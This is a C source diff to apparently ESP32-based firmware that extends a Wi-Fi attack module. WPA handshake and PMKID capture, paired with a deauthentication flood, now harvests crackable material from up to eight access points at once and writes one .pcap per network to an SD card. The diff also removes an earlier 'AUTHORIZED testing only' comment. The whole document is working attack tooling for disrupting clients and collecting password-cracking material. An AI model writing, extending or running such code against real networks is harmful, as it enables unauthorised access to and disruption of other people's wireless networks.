@@ -177,69 +177,87 @@ static void add_station(const uint8_t *bssid, const uint8_t *mac)
     taskEXIT_CRITICAL(&s_mux);
 }
 
-// ---- WPA 4-way-handshake capture --------------------------------------------
+// ---- WPA 4-way-handshake + PMKID capture (MULTI-AP harvest) ------------------
 // Paired with the deauth flood: kicking clients forces them to re-authenticate, and the resulting
-// EAPOL-Key frames are the crackable material. We lock onto ONE AP (the first whose handshake we
-// hear), copy up to one frame per message (M1..M4) into a small heap buffer from the RX callback
-// (tiny crit-section, no SD there), and write a standard .pcap to SD on stop (UI task). DLT 105 =
-// IEEE 802.11. AUTHORIZED testing only. EAPOL classification is the host-tested wifiatk_eapol_msg.
+// EAPOL-Key frames are the crackable material. In flood-ALL we hear handshakes from MANY APs at once,
+// so we keep a per-AP table (up to HS_MAX_AP), store one frame per message (M1..M4) + the PMKID per AP
+// from the RX callback (tiny crit-section, no SD there), and on stop write one standard .pcap per AP
+// to SD (UI task). DLT 105 = IEEE 802.11. EAPOL/PMKID parsing is the host-tested eapol module.
 #define HS_FRAME_MAX 256
+#define HS_MAX_AP    8
 typedef struct { uint8_t buf[HS_FRAME_MAX]; uint16_t len; uint8_t msg; } hs_frame_t;
-static hs_frame_t   *s_hs;                 // heap, allocated at deauth_start (not resident .bss)
-static volatile int  s_hs_n;
-static volatile uint8_t s_hs_mask;         // bit m set once message m (1..4) is captured
-static uint8_t       s_hs_bssid[6];        // the AP we locked onto
-static char          s_hs_path[64];        // .pcap written on stop ("" if none)
-static uint8_t       s_hs_pmkid[16];       // PMKID from message 1, if the AP advertises one
-static volatile bool s_hs_have_pmkid;      // clientless crackable material captured
+typedef struct {
+    uint8_t    bssid[6];
+    uint8_t    mask;          // EAPOL messages captured (bit m)
+    uint8_t    nfr;           // frames stored (<= 4)
+    bool       have_pmkid;
+    hs_frame_t fr[4];
+    uint8_t    pmkid[16];
+} hs_ap_t;
+static hs_ap_t      *s_hs;                  // heap array[HS_MAX_AP], allocated at deauth_start
+static volatile int  s_hs_naps;             // distinct APs we've heard EAPOL from
+static char          s_hs_path[64];         // last .pcap written
+
+static bool ap_usable(const hs_ap_t *a) { return (a->mask & 0x06) == 0x06 || (a->mask & 0x18) == 0x18; }
+static int  hs_count_usable(void) { int n = 0; for (int i = 0; i < s_hs_naps; i++) if (ap_usable(&s_hs[i])) n++; return n; }
+static int  hs_count_pmkid(void)  { int n = 0; for (int i = 0; i < s_hs_naps; i++) if (s_hs[i].have_pmkid) n++; return n; }
 
 static void hs_add(const uint8_t *bssid, const uint8_t *frame, int len, int msg)
 {
     if (!s_hs || len <= 0 || len > HS_FRAME_MAX) return;
-    // PMKID parse OUTSIDE the lock (pure, bounded); only message 1 can carry one.
     uint8_t pm[16]; bool got_pm = (msg == 1) && wifiatk_eapol_pmkid(frame, len, pm) == 1;
     taskENTER_CRITICAL(&s_mux);
-    if (s_hs_n == 0) memcpy(s_hs_bssid, bssid, 6);           // lock onto the first AP we hear
-    if (mac_eq(bssid, s_hs_bssid)) {
-        if (s_hs_n < 4 && !(s_hs_mask & (1u << msg))) {
-            memcpy(s_hs[s_hs_n].buf, frame, len);
-            s_hs[s_hs_n].len = (uint16_t)len; s_hs[s_hs_n].msg = (uint8_t)msg;
-            s_hs_n++; s_hs_mask |= (uint8_t)(1u << msg);
+    int i = -1;
+    for (int k = 0; k < s_hs_naps; k++) if (mac_eq(s_hs[k].bssid, bssid)) { i = k; break; }
+    if (i < 0 && s_hs_naps < HS_MAX_AP) {
+        i = s_hs_naps++;
+        memcpy(s_hs[i].bssid, bssid, 6); s_hs[i].mask = 0; s_hs[i].nfr = 0; s_hs[i].have_pmkid = false;
+    }
+    if (i >= 0) {
+        if (s_hs[i].nfr < 4 && !(s_hs[i].mask & (1u << msg))) {
+            hs_frame_t *fr = &s_hs[i].fr[s_hs[i].nfr++];
+            memcpy(fr->buf, frame, len); fr->len = (uint16_t)len; fr->msg = (uint8_t)msg;
+            s_hs[i].mask |= (uint8_t)(1u << msg);
         }
-        if (got_pm && !s_hs_have_pmkid) { memcpy(s_hs_pmkid, pm, 16); s_hs_have_pmkid = true; }
+        if (got_pm && !s_hs[i].have_pmkid) { memcpy(s_hs[i].pmkid, pm, 16); s_hs[i].have_pmkid = true; }
     }
     taskEXIT_CRITICAL(&s_mux);
 }
 
-// A crackable handshake = messages 1+2 or 3+4 of the same AP.
-static bool hs_usable(void) { return (s_hs_mask & 0x06) == 0x06 || (s_hs_mask & 0x18) == 0x18; }
-
-// Write the captured frames to /sd/handshakes/<bssid>.pcap (UI task only). Best-effort.
+// Write one /sd/handshakes/hs_<bssid>.pcap per AP we captured frames from (UI task only). Best-effort.
 static void hs_write_pcap(void)
 {
     s_hs_path[0] = 0;
-    if (!s_hs || s_hs_n == 0) return;
+    if (!s_hs || s_hs_naps == 0) return;
     mkdir("/sd/handshakes", 0775);
-    const uint8_t *b = s_hs_bssid;
-    snprintf(s_hs_path, sizeof s_hs_path, "/sd/handshakes/hs_%02X%02X%02X%02X%02X%02X.pcap",
-             b[0], b[1], b[2], b[3], b[4], b[5]);
-    FILE *f = fopen(s_hs_path, "wb");
-    if (!f) { s_hs_path[0] = 0; return; }
-    uint32_t gh[] = { 0xA1B2C3D4u, 0, 0, 0, 65535u, 105u };          // PCAP global header, DLT 105
-    uint16_t ver[] = { 2, 4 };
-    fwrite(&gh[0], 4, 1, f); fwrite(ver, 2, 2, f);
-    fwrite(&gh[1], 4, 4, f);                                          // zone,sig,snaplen,network
-    for (int i = 0; i < s_hs_n; i++) {
-        uint32_t rh[] = { (uint32_t)i, 0, s_hs[i].len, s_hs[i].len };  // ts_sec,ts_usec,incl,orig
-        fwrite(rh, 4, 4, f);
-        fwrite(s_hs[i].buf, 1, s_hs[i].len, f);
+    for (int a = 0; a < s_hs_naps; a++) {
+        hs_ap_t *ap = &s_hs[a];
+        if (ap->nfr == 0) continue;
+        const uint8_t *b = ap->bssid;
+        char path[64];
+        snprintf(path, sizeof path, "/sd/handshakes/hs_%02X%02X%02X%02X%02X%02X.pcap",
+                 b[0], b[1], b[2], b[3], b[4], b[5]);
+        FILE *f = fopen(path, "wb");
+        if (!f) continue;
+        uint32_t gh[] = { 0xA1B2C3D4u, 0, 0, 0, 65535u, 105u };      // PCAP global header, DLT 105
+        uint16_t ver[] = { 2, 4 };
+        fwrite(&gh[0], 4, 1, f); fwrite(ver, 2, 2, f);
+        fwrite(&gh[1], 4, 4, f);                                      // zone,sig,snaplen,network
+        for (int i = 0; i < ap->nfr; i++) {
+            uint32_t rh[] = { (uint32_t)i, 0, ap->fr[i].len, ap->fr[i].len };
+            fwrite(rh, 4, 4, f);
+            fwrite(ap->fr[i].buf, 1, ap->fr[i].len, f);
+        }
+        fclose(f);
+        snprintf(s_hs_path, sizeof s_hs_path, "%s", path);           // remember the last written
     }
-    fclose(f);
 }
 
-int         nucleo_wifiatk_handshake_msgmask(void) { return s_hs ? s_hs_mask : 0; }
-bool        nucleo_wifiatk_handshake_ready(void)   { return s_hs && hs_usable(); }
-bool        nucleo_wifiatk_handshake_pmkid(void)   { return s_hs && s_hs_have_pmkid; }
+int         nucleo_wifiatk_handshake_aps(void)     { return s_hs ? s_hs_naps : 0; }       // APs heard EAPOL from
+int         nucleo_wifiatk_handshake_count(void)   { return s_hs ? hs_count_usable() : 0; } // APs with a usable HS
+int         nucleo_wifiatk_handshake_pmkidn(void)  { return s_hs ? hs_count_pmkid() : 0; }  // APs with a PMKID
+bool        nucleo_wifiatk_handshake_ready(void)   { return s_hs && hs_count_usable() > 0; }
+bool        nucleo_wifiatk_handshake_pmkid(void)   { return s_hs && hs_count_pmkid() > 0; }
 const char *nucleo_wifiatk_handshake_path(void)    { return s_hs_path; }
 
 // Parse one sniffed frame; if it belongs to a target AP, learn the station MAC.
@@ -603,8 +621,8 @@ esp_err_t nucleo_wifiatk_deauth_start(int target_idx)
     s_cur_ssid[0] = 0;
     s_start_us = esp_timer_get_time();
     // Handshake capture buffer (heap, not resident .bss). Failure just disables capture, not the flood.
-    s_hs_n = 0; s_hs_mask = 0; s_hs_path[0] = 0; s_hs_have_pmkid = false;
-    if (!s_hs) s_hs = malloc(sizeof(hs_frame_t) * 4);
+    s_hs_naps = 0; s_hs_path[0] = 0;
+    if (!s_hs) s_hs = malloc(sizeof(hs_ap_t) * HS_MAX_AP);
 
     // We OWN the radio here (raw injection) — exclusive never touches Wi-Fi (no NX_WIFI), so we still
     // suspend STA auto-reconnect ourselves. NX_NET_APP also frees voice + ANIMA L1 (~24KB) the old
